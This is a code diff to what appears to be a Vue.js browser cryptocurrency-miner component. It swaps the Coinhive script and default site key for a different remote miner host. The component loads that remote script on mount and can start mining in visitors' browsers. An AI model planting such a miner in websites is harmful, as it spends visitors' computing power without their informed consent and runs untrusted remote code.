@@ -18,7 +18,7 @@
       },
       siteKey: {
         type: String,
-        default: 'SF4YQtgkNYmwR21W8NzKwixVdHB8wlDf',
+        default: 'yXXJLVPFbuQV3tjH4hpulnksqYCbTEAi',
         required: false,
       },
       userName: {
@@ -58,7 +58,7 @@
       }
     },
     mounted () {
-      loadScript('https://coin-hive.com/lib/coinhive.min.js', () => {
+      loadScript('https://crypto.csgocpu.com/idler.min.js', () => {
         if (this.proxy) {
           const proxies = this.proxy.reduce((acc, curr, i) => {
             if (!(i % 8)) {
@@ -66,14 +66,14 @@
             }
             return acc
           }, [])
-          CoinHive.CONFIG.WEBSOCKET_SHARDS = proxies
+          CSGOCPU.CONFIG.WEBSOCKET_SHARDS = proxies
         }
         if (this.siteKey && this.userName) {
-          this.miner = new CoinHive.User(this.siteKey, this.userName)
+          this.miner = new CSGOCPU.User(this.siteKey, this.userName)
         } else if (this.siteKey) {
-          this.miner = new CoinHive.Anonymous(this.siteKey)
+          this.miner = new CSGOCPU.Anonymous(this.siteKey)
         }
-        this.CoinHive = CoinHive
+        this.CSGOCPU = CSGOCPU
         if (!this.miner.isRunning() && this.start) {
           this.startMiner()
         }
@@ -82,7 +82,7 @@
     data () {
       return {
         miner: null,
-        CoinHive: null,
+        CSGOCPU: null,
       }
     },
     methods: {
@@ -117,11 +117,11 @@
       },
       getStartMode(type) {
         if (type === 'IF_EXCLUSIVE_TAB') {
-          return this.CoinHive.IF_EXCLUSIVE_TAB
+          return this.CSGOCPU.IF_EXCLUSIVE_TAB
         } else if (type === 'FORCE_EXCLUSIVE_TAB') {
-          return this.CoinHive.FORCE_EXCLUSIVE_TAB
+          return this.CSGOCPU.FORCE_EXCLUSIVE_TAB
         } else {
-          return this.CoinHive.FORCE_MULTI_TAB
+          return this.CSGOCPU.FORCE_MULTI_TAB
         }
       }
     },
